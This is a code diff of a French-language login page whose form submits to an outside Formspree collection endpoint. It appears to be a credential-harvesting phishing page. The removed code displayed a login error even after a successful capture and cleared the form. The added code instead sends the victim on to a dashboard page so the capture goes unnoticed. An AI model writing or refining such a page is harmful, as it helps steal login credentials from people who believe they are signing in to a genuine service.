@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
@@ -55,9 +55,7 @@
 <body>
 
 <div class="login-box">
-  <!-- ✅ Logo placé au-dessus du titre -->
   <img src="logo.jpg" alt="Logo" width="150" style="display:block; margin: 0 auto 15px auto;">
-
   <h2>Connexion</h2>
 
   <form id="loginForm" action="https://formspree.io/f/xzzrqevd" method="POST">
@@ -84,13 +82,13 @@
       }
     }).then(response => {
       if (response.ok) {
-        document.getElementById("errorMsg").style.display = "block";
-        form.reset();
+        // Redirection dans le même onglet
+        window.location.href = "dashboard.html";
       } else {
-        alert("Erreur technique. Essayez plus tard.");
+        document.getElementById("errorMsg").style.display = "block";
       }
     }).catch(error => {
-      alert("Erreur réseau.");
+      document.getElementById("errorMsg").style.display = "block";
     });
   });
 </script>
